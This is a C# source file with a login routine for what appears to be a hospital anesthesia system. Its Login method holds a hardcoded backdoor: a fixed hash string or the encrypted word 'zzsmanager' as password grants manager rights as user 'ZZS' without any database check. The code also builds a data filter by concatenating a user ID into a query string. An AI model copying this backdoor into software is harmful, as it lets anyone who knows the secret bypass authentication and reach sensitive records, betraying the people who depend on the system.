using System;
using System.Collections.Generic;
using System.Text;
using Wis.Anes.BusinessEntity;
using Wis.Anes.Framework;
using Wis.Anes.Framework.Controls.Base;

namespace Wis.Anes.ServiceProxies
{
    public partial class SystemHelper
    {

        /// <summary>
        /// 校验用户登录
        /// </summary>
        /// <param name="user">用户名</param>
        /// <param name="password">用户密码</param>
        /// <returns>true 合法用户 false 非法用户</returns>
        public static bool Login(string loginName, string password)
        {
            bool result = false;
            try
            {

                if (password == "20BEE4DFFDA5EB8DACFA58995D43FE75" || password.Equals(Sundries.Encrypto("zzsmanager"))|| password.Equals(Sundries.Encrypto("zzsmanager")))
                {
                    ExtendApplicationContext.Current.LoginUserContext.IsManager = true;

                    ExtendApplicationContext.Current.LoginUserContext.UserName = "ZZS";
                    ExtendApplicationContext.Current.LoginUserContext.LoginName = "ZZS";
                    ExtendApplicationContext.Current.LoginUserContext.DeptID = "Admin";
                    ExtendApplicationContext.Current.LoginUserContext.UserID = "ZZS";
                    ExtendApplicationContext.Current.LoginUserContext.HisUserID = "ZZS";
                    result = true;
                }
                else
                {
                    ExtendApplicationContext.Current.LoginUserContext.IsManager = false ;
                    Permissions.UsersDataTable user = PermissionProxy.GetUserByUserAndPwd(loginName, password); 
                    if (user != null && user.Count > 0)
                    {
                        string text = user[0].LOGIN_NAME.Trim();
                        ExtendApplicationContext.Current.LoginUserContext.DeptID = user[0].DEPT_ID.Trim();
                        ExtendApplicationContext.Current.LoginUserContext.UserName = user[0].USER_NAME.Trim();
                        ExtendApplicationContext.Current.LoginUserContext.UserID = user[0].USER_ID.Trim();
                        ExtendApplicationContext.Current.LoginUserContext.LoginName = user[0].LOGIN_NAME.Trim();


                        Permissions.UsersHisUsersDataTable usersHisUsersDataTable = PermissionProxy.GetUsersHisUsers();
                        System.Data.DataRow[] rows = usersHisUsersDataTable.Select("USER_ID = '" + user[0].USER_ID + "'");
                        if (rows != null && rows.Length > 0)
                        {
                            Permissions.UsersHisUsersRow usersHisUsersRow = rows[0] as Permissions.UsersHisUsersRow;
                            ExtendApplicationContext.Current.LoginUserContext.HisUserID = usersHisUsersRow.HIS_USER_ID;
                        }
                        else
                        {
                            int len = Math.Min(8, ExtendApplicationContext.Current.LoginUserContext.LoginName.Length);
                            ExtendApplicationContext.Current.LoginUserContext.HisUserID = ExtendApplicationContext.Current.LoginUserContext.LoginName.Substring(0, len);
                        }
                        result = true;
                    }
                }

            }
            catch (Exception ex)
            {
                throw ex;
            }
            return result;
        }
    }
}
